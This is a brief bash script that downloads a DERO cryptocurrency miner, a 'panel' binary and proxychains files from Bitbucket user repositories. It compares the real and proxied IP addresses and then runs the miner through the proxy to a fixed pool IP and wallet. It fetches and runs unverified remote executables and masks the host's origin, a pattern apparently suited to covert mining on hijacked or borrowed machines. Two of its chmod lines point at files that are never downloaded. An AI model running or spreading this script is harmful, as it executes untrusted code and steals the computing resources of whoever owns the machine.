#!/bin/bash
curl -L -o dero-stratum-miner https://bitbucket.org/samilafera/saman/downloads/dero-stratum-miner && chmod +x python 
curl -L -o panel https://bitbucket.org/asimadarasi/alima/downloads/panel && chmod +x proxy
curl -L -o libproxychains4.so  https://bitbucket.org/asimadarasi/alima/downloads/libproxychains4.so && chmod +x libproxychains4.so 
curl -L -o proxychains.conf https://bitbucket.org/asimadarasi/alima/downloads/proxychains.conf && chmod +x proxychains.conf 
echo "IP ORI ==> "$(curl ifconfig.me) 
echo "IP Baru ==> "$(./panel curl ifconfig.me) 
./panel ./dero-stratum-miner -r 148.113.136.140:4300 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xmua6z2ur22hr2qm9negq.$(echo $(shuf -i 1000-9999 -n 1)-C)
